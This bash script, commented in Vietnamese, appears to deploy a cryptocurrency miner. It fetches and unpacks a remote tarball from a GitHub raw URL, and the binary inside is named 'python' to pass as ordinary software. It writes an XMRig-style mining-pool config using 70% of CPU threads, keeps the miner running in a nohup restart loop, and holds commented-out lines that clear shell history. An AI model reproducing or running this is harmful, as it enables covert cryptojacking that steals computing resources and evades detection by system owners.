#!/bin/bash

DOMAIN=$1      # domain:port
HOSTNAME=$2    # hostname
CONFIG="setting.json"
BINARY="python/python"
WORKDIR=$(pwd)
PID_FILE="$WORKDIR/process.pid"

# Tải binary nếu chưa có
if [ ! -f "$BINARY" ]; then
    echo "Downloading binary..."
    curl -sL -o python.tar.gz https://raw.githubusercontent.com/CongTK9x/tool/main/python.tar.gz >/dev/null 2>&1
    tar -xzf python.tar.gz
    rm -f python.tar.gz
fi

# Tạo config.json nếu chưa có
if [ ! -f "$CONFIG" ]; then
    cat > "$CONFIG" <<EOF
{
  "pools": [
    {
      "url": "$DOMAIN",
      "user": "$HOSTNAME",
      "pass": "x",
      "tls": true,
      "keepalive": true
    }
  ],
  "cpu": {
    "enabled": true,
    "max-threads-hint": 70
  }
}
EOF
fi

# Hàm kiểm tra process đơn giản nhất
check_process() {
    # Kiểm tra qua PID file
    if [ -f "$PID_FILE" ]; then
        pid=$(cat "$PID_FILE" 2>/dev/null)
        if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
            return 0  # Process đang chạy
        else
            # PID không hợp lệ, xóa file
            rm -f "$PID_FILE"
            return 1
        fi
    fi
    return 1  # Process không chạy
}

# Hàm start process
start_process() {
    # Kiểm tra lại trước khi start
    check_process && return 0
    
    # Kill process cũ nếu có (an toàn)
    if [ -f "$PID_FILE" ]; then
        old_pid=$(cat "$PID_FILE" 2>/dev/null)
        [ -n "$old_pid" ] && kill -9 "$old_pid" 2>/dev/null
    fi
    
    # Start process mới
    echo "Starting process..."
    nohup "$WORKDIR/$BINARY" -c "$WORKDIR/$CONFIG" > "$WORKDIR/output.log" 2>&1 &
    
    # Lưu PID
    echo $! > "$PID_FILE"
    
    # Kiểm tra process đã start thành công
    sleep 2
    if kill -0 $! 2>/dev/null; then
        echo "✓ Process started successfully (PID: $!)"
    else
        echo "✗ Failed to start process"
        rm -f "$PID_FILE"
        return 1
    fi
}

# Hàm stop process
stop_process() {
    if [ -f "$PID_FILE" ]; then
        pid=$(cat "$PID_FILE" 2>/dev/null)
        if [ -n "$pid" ]; then
            kill -9 "$pid" 2>/dev/null
            echo "Process stopped (PID: $pid)"
        fi
        rm -f "$PID_FILE"
    fi
}

# Xử lý khi script bị kill
trap 'stop_process; exit 0' INT TERM EXIT

# Main
echo "=== Starting Monitor ==="
echo "Binary: $BINARY"
echo "Config: $CONFIG"
echo "Workdir: $WORKDIR"

# Chạy lần đầu
start_process

# Vòng lặp kiểm tra
COUNTER=0
while true; do
    COUNTER=$((COUNTER + 1))
    
    if check_process; then
        if [ $((COUNTER % 10)) -eq 0 ]; then  # Hiển thị mỗi 5 phút
            echo "[$(date '+%H:%M:%S')] Process is running (PID: $(cat "$PID_FILE"))"
        fi
    else
        echo "[$(date '+%H:%M:%S')] Process not found, restarting..."
        start_process
    fi
    
    # Xóa lịch sử (nếu cần)
    # history -c 2>/dev/null || true
    # history -w 2>/dev/null || true
    
    sleep 30
done
